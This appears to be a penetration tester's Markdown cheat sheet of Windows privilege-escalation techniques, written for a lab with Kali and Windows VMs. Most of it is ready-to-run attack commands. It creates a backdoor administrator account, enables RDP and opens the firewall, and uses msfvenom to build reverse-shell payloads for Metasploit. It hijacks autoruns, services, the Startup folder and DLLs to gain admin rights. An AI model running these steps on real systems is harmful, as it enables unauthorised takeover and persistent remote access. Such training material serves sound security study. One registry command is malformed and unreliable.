# Windows Privlage Escalation
![alt text](https://miro.medium.com/max/2400/0*I-5KzneqUHfF7bHR.png)
## Kernel Exploits
- https://github.com/SecWiki/windows-kernel-exploits
## Admin Service that a Standard User can run
- https://www.youtube.com/watch?v=3BQKpPNlTSo
## Run Executable in Background
````
start /B program
````
## Disable/Enable Group Policy
- Disable:
````
REG add "HKCU\Software\Policies\Microsoft\MMC{8FC0B734-A0E1-11D1-A7D3-0000F87571E3}" /v Restrict_Run /t REG_DWORD /d 1 /f
````
## Enable:
````
REG add "HKCU\Software\Policies\Microsoft\MMC{8FC0B734-A0E1-11D1-A7D3-0000F87571E3}" /v Restrict_Run /0 REG_DWORD /d 1 /f
Add Admin & Enable RDP
net user /add hacked Password1
net localgroup administrators hacked /add
net localgroup Administrateurs hacked /add (For French target)
net localgroup "Remote Desktop Users" hacked /add
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fAllowToGetHelp /t REG_DWORD /d 1 /f
netsh firewall set service type = REMOTEDESKTOP mode = ENABLE scope = CUSTOM addresses = 10.0.0.1
````
## xfreerdp
````
xfreerdp /v:10.10.25.227 /u:Wade /p:parzival /cert:ignore /drive:/usr/share/windows-resources,share /dynamic-resolution
````
#### Credit
- Taken from Tib3rius

## Basic Enumeration
- Find out the users on the box and enumerate their privlages
````
net users
net users Administrator
````
## Registry Escalation - Autoruns
- Detection
- Open command prompt and type: 
````
C:\Users\User\Desktop\Tools\Autoruns\Autoruns64.exe
````
- In Autoruns, click on the `Logon` tab.
- From the listed results, notice that the “My Program” entry is pointing to 
````
C:\Program Files\Autorun Program\program.exe
````
- In command prompt type: 
````
C:\Users\User\Desktop\Tools\Accesschk\accesschk64.exe -wvu "C:\Program Files\Autorun Program"
````
- From the output, notice that the `"Everyone"` user group has `"FILE_ALL_ACCESS"` permission on the `"program.exe"` file.
- Exploitation
- Kali VM
- Open command prompt and type: `msfconsole`
- In Metasploit (msf > prompt) type: `use multi/handler`
- In Metasploit (msf > prompt) type: `set payload windows/meterpreter/reverse_tcp` or `windows/x64/shell/reverse_tcp`
- In Metasploit (msf > prompt) type: `set lhost [Kali VM IP Address]`
- In Metasploit (msf > prompt) type: `run`
- Open an additional command prompt and type: `msfvenom -p windows/meterpreter/reverse_tcp lhost=[Kali VM IP Address] -f exe -o program.exe`
- Copy the generated file, `program.exe`, to the Windows VM.
- Windows VM
- Place `program.exe` in `C:\Program Files\Autorun Program`
- To simulate the privilege escalation effect, logoff and then log back on as an administrator user.
- Kali VM
- Wait for a new session to open in Metasploit.
- In Metasploit (msf > prompt) type: `sessions -i [Session ID]`
- To confirm that the attack succeeded, in Metasploit (msf > prompt) type: `getuid`
## Registry Escalation AlwaysInstallElevated
- Detection
- Windows VM
- Open command prompt and type: 
````
reg query HKLM\Software\Policies\Microsoft\Windows\Installer
````
- From the output, notice that `AlwaysInstallElevated` value is `1`.
- In command prompt type: 
````
reg query HKCU\Software\Policies\Microsoft\Windows\Installer
````
- From the output, notice that `AlwaysInstallElevated` value is `1`.
- Exploitation
- Kali VM

- Open command prompt and type: msfconsole
- In Metasploit (msf > prompt) type: `use multi/handler`
- In Metasploit (msf > prompt) type: set payload `windows/meterpreter/reverse_tcp` or `windows/shell_reverse_tcp`
- In Metasploit (msf > prompt) type: `set lhost [Kali VM IP Address]`
- In Metasploit (msf > prompt) type: `run`
- Open an additional command prompt and type: 
````
msfvenom -p windows/meterpreter/reverse_tcp lhost=[Kali VM IP Address] -f msi -o setup.msi
````
- Copy the generated file, setup.msi, to the Windows VM.

Windows VM

- Place `setup.msi` in `C:\Temp`.
- Open command prompt and type: 
````
msiexec /quiet /qn /i C:\Temp\setup.msi
````
## Service Escalation The Registry
- Detection
- Windows VM
- Open powershell prompt and type: 
````
Get-Acl -Path hklm:\System\CurrentControlSet\services\regsvc | fl
````
- Notice that the output suggests that user belong to `NT AUTHORITY\INTERACTIVE` has `FullContol` permission over the registry key.
- Exploitation
- Windows VM
- Copy `C:\Users\User\Desktop\Tools\Source\windows_service.c` to the Kali VM.

Kali VM
- Open windows_service.c in a text editor and replace the command used by the `system()` function to: `cmd.exe /k net localgroup administrators user /add`
- Exit the text editor and compile the file by typing the following in the command prompt: 
````
x86_64-w64-mingw32-gcc windows_service.c -o x.exe 
````
- (NOTE: if this is not installed, use `sudo apt install gcc-mingw-w64`) 
- Copy the generated file `x.exe`, to the Windows VM.

Windows VM

- Place `x.exe` in `C:\Temp`.
- Open command prompt at type: 
````
reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d c:\temp\x.exe /f
````
- In the command prompt type: `sc start regsvc`
- It is possible to confirm that the user was added to the local administrators group by typing the following in the command prompt: 
````
net localgroup administrators
````
## Service Escalation Executable Files
- Detection
- Windows VM
- Open command prompt and type: 
````
C:\Users\User\Desktop\Tools\Accesschk\accesschk64.exe -wvu "C:\Program Files\File Permissions Service"
````
- Notice that the `Everyone` user group has `FILE_ALL_ACCESS` permission on the filepermservice.exe file.
- Exploitation
- Windows VM
- Open command prompt and type: 
````
copy /y c:\Temp\x.exe "c:\Program Files\File Permissions Service\filepermservice.exe"
````
- In command prompt type: `sc start filepermsvc`
- It is possible to confirm that the user was added to the local administrators group by typing the following in the command prompt: `net localgroup administrators`
## Startup Applications
- Detection
- Windows VM
- Open command prompt and type: icacls.exe 
````
"C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
````
- From the output notice that the `BUILTIN\Users` group has full access `(F)` to the directory.
- Exploitation
- Kali VM
- Open command prompt and type: `msfconsole`
- In Metasploit (msf > prompt) type: `use multi/handler`
- In Metasploit (msf > prompt) type: `set payload windows/meterpreter/reverse_tcp` or `windows/shell_reverse_tcp`
- In Metasploit (msf > prompt) type: `set lhost [Kali VM IP Address]`
- In Metasploit (msf > prompt) type: `run`
- Open another command prompt and type: `msfvenom -p windows/shell_reverse_tcp LHOST=[Kali VM IP Address] -f exe -o x.exe`
- Copy the generated file, `x.exe`, to the Windows VM.
- Windows VM
- Place `x.exe` in `"C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"`
- Logoff.
- Login with the administrator account credentials.
- Kali VM
- Wait for a session to be created, it may take a few seconds.
- In Meterpreter(meterpreter > prompt) type: `getuid` or `whoami`
- From the output, notice the user is `User-PC\Admin`
## DLL Hijacking
- Detection
- Windows VM
- Open the Tools folder that is located on the desktop and then go the Process Monitor folder.
- In reality, executables would be copied from the victim’s host over to the attacker’s host for analysis during run time. 
- Alternatively, the same software can be installed on the attacker’s host for analysis, in case they can obtain it. To simulate this, right click on `Procmon.exe` and select `Run as administrator` from the menu.
- In procmon, select `filter`.  From the left-most drop down menu, select `Process Name`.
- In the input box on the same line type: `dllhijackservice.exe`
- Make sure the line reads `Process Name is dllhijackservice.exe` then `Include` and click on the `Add` button, then `Apply` and lastly on `OK`.
- Next, select from the left-most drop down menu `Result`.
- In the input box on the same line type: `NAME NOT FOUND`
- Make sure the line reads `Result is NAME NOT FOUND then Include` and click on the `Add` button, then `Apply` and lastly on `OK`.
- Open command prompt and type: 
```` 
sc start dllsvc
````
- Scroll to the bottom of the window. One of the highlighted results shows that the service tried to execute `C:\Temp\hijackme.dll` yet it could not do that as the file was not found. Note that `C:\Temp` is a writable location.
- Exploitation
- Windows VM

- Copy `C:\Users\User\Desktop\Tools\Source\windows_dll.c` to the Kali VM.
- Kali VM
- Open `windows_dll.c` in a text editor and replace the command used by the `system()` function to: `cmd.exe /k net localgroup administrators user /add`
- Exit the text editor and compile the file by typing the following in the command prompt: `x86_64-w64-mingw32-gcc windows_dll.c -shared -o hijackme.dll`
- Copy the generated file `hijackme.dll`, to the Windows VM.
- Windows VM
- Place hijackme.dll in `C:\Temp`.
- Open command prompt and type: `sc stop dllsvc & sc start dllsvc`
- It is possible to confirm that the `user` was added to the `local administrators group` by typing the following in the command prompt: 
````
net localgroup administrators
````












